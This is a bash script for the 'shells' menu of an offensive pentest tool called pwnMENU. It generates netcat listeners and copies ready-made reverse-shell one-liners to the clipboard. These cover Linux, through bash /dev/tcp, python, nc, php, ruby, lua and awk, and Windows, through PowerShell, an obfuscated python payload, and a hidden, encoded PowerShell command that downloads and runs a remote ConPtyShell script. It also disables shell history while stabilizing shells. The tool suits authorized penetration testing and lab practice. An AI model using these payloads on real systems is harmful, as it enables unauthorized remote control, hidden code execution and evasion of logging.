#!/bin/bash
####################### #### ## #  #
# >> pwnMENU - shells
################### #### ## #  #    #
#
# >> this file contains the "shells" sub menu and all it's functions

menu_shells()
{
	if [ "$target_os" == "linux" ]; then
        lines=7
        menu="$(pfx -n "LISTEN") start netcat listener\n<small>generates netcat listener command (clipboard)</small>$lb$(pfx -n "STABLE") stabilize shell\n<small>stabilizes linux shells (highlight the window first!)</small>$lb$(pfx -n "SPAWN") spawn shell\n<small>generates command to spawn shell (clipboard)</small>$lb$(pfx -n "TTY") TTY\n<small>generates TTY shells via python (clipboard)</small>$lb$(pfx -n "MSFVENOM") msfvenom\n<small>generates MSFVenom payloads (clipboard)</small>$lb$lbrk$lb$(pfx -n "BACK") go back..."
    elif [ "$target_os" == "windows" ]; then
        lines=5
        menu="$(pfx -n "LISTEN") start netcat listener\n<small>generates netcat listener command (clipboard)</small>$lb$(pfx -n "SPAWN") spawn shell\n<small>generates command to spawn shell (clipboard)</small>$lb$(pfx -n "MSFVENOM") msfvenom\n<small>generates MSFVenom payloads (clipboard)</small>$lb$lbrk$lb$(pfx -n "BACK") go back..."
    fi
	msg="pwnMENU > <b>shells</b>\n<small>from spawning or generating, to listener setup or stabilization...</small>"
	result=$(echo -e "$menu" | rf "SHELLS" "$msg" $lines)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"LISTEN")
            get_ports
			set_port
			payload="rlwrap nc -lnvp $port"
            echo -ne $payload | xclip -sel clip
            rf_msg "$(pfx -n "INFO") netcat listener command copied to the clipboard."
            exit 0
			;;
		"STABLE")
			shell_stabilize
			;;
		"SPAWN")
			shell_spawn
			;;
		"TTY")
			shell_tty_spawn
			;;
		"MSFVENOM")
			msfv_main
			;;
		"BACK")
			main
			;;
	esac
}

shell_stabilize()
{
	cmd "python -c 'import pty;pty.spawn(\"/bin/bash\")' || python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    sleep 0.1
	cmd "unset HISTFILE PROMPT_COMMAND; HISTSIZE=0; HISTFILESIZE=0"
    sleep 0.1
	ctrl Z
	cmd 'stty raw -echo; stty size | xclip -sel clip; fg'
	sleep 0.5
	xte "key Return"
    sleep 0.1
    xte 'str export STTYSIZE="'
	ctrl_shift V
	xte "key Backspace"
	xte "key Backspace"
	cmd '"'
	xte "key Return"
    sleep 0.1
	cmd 'export ROWS=$(echo $STTYSIZE | cut -f1 -d " ")'
    sleep 0.1
	cmd 'export COLS=$(echo $STTYSIZE | cut -f2 -d " ")'
    sleep 0.1
	cmd 'stty rows $ROWS cols $COLS'
    sleep 0.1
	cmd "export TERM=xterm-256color"
	sleep 0.1
	cmd "unset STTYSIZE ROWS COLS"
}

shell_spawn()
{
    get_ips
	get_ports
	if [ "$payload" == "" ]; then
        payload="none"
    fi

	options="$(pfx "SHELL") $shell\n$(pfx "IP") $ip\n$(pfx "PORT") $port\n$(pfx "SPAWNER") $spawner\n$lbrk\n$(pfx "GEN") generate shell spawn\n$(pfx "BACK") go back to main"

    result=$(echo -e "$options" | rf "SH_SPAWN" "" 7)
    result=$(echo $result | awk '{print $1}')
	case $result in
        "SHELL")
            if [ "$target_os" == "linux" ]; then
                shells="$(pfx "BASH") /bin/bash\n$(pfx "SH") /bin/sh\n$(pfx "ZSH") /bin/zsh"
            elif [ "$target_os" == "windows" ]; then
                shells="$(pfx "CMD") cmd.exe\n$(pfx "PSH") powershell.exe\n"
            fi
            shell=$(echo -e "$shells" | rf "SHELLS")
            shell=$(echo $shell | awk '{print $3}')
            shell_spawn
            ;;
        "IP")
            set_ip
            shell_spawn
            ;;
        "PORT")
            set_port
            shell_spawn
            ;;
        "SPAWNER")
            if [ "$shell" == "" ]; then
                rf_msg "$(pfx -n "ERROR") you need to select a SHELL first..."
            else
                if [ "$target_os" == "linux" ]; then
                    spawners="bash\npython\nnc\nphp\nruby\nlua\nawk"
                    spawner=$(echo -e "$spawners" | rf "SPAWNER" "" 7)
                    case $spawner in
                        "bash")
                            payload="bash -c 'bash -i &>/dev/tcp/$ip/$port <&1'";
                            ;;
                        "python")
                            payload="python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["$shell","-i"]);'"
                            ;;
                        "nc")
                            payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $ip $port >/tmp/f";
                            ;;
                        "php")
                            initial="$shell -i <&3 >&3 2>&3";
                            payload="php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"$initial\");'";
                            ;;
                        "ruby")
                            payload="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
                            ;;
                        "lua")
                            payload="lua -e 'require('socket');require('os');t=socket.tcp();t:connect('$ip','$port');os.execute('$shell <&3 >&3 2>&3');'";
                            ;;
                        "awk")
                            payload="awk 'BEGIN {s = \"/inet/tcp/0/$ip/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null";
                            ;;
                    esac
                elif [ "$target_os" == "windows" ]; then
                    echo "is windows..."
                    spawners="powershell\npython\nphp\nruby\nlua\nconpty"
                    spawner=$(echo -e "$spawners" | rf "SPAWNER" "" 6)
                    echo "spawner = $spawner"
                    case $spawner in
                        "powershell")
                            initial="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
                            payload="powershell -nop -c $initial"
                            ;;
                        "python")
                            payload="python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$ip', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\$shell'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
                            ;;
                        "php")
                            initial="$shell <&3 >&3 2>&3";
                            payload="php -r '\$sock=fsockopen((\"$ip\",$port);system(\"$initial\");'";
                            ;;
                        "ruby")
                            payload="ruby -rsocket -e 'c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
                            ;;
                        "lua")
                            payload="lua5.1 -e 'local host, port = \"$ip\", $port local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'";
                            ;;
                        "conpty")
                            initial=$(echo -n "IEX(IWR $httpd_url/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp $ip -RemotePort $port" | iconv -t UTF-16LE | base64 -w 0)
                            payload="powershell -nop -Windowstyle hidden -ep bypass -enc $initial"
                            ;;
                    esac
                fi
            fi
            echo "payload = $payload"
            shell_spawn
            ;;
        "GEN")
            echo -ne $payload | xclip -sel clip
            rf_msg "$(pfx -n "INFO") shell spawn command copied to the clipboard."
            ;;
        "BACK")
            shells
            ;;
    esac
}

shell_tty_spawn()
{
	menu="python\npython3\nos-system"
	result=$(echo -e "$menu" | rf "TTYSPAWN" "" 3)

	case $result in
		"python")
			payload="python -c 'import pty;pty.spawn(\"/bin/bash\")'"
			;;
		"python3")
			payload="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
			;;
		"os-system")
			payload="echo os.system(\"/bin/bash\")"
			;;
	esac
	echo -n $payload | xclip -sel clip
}
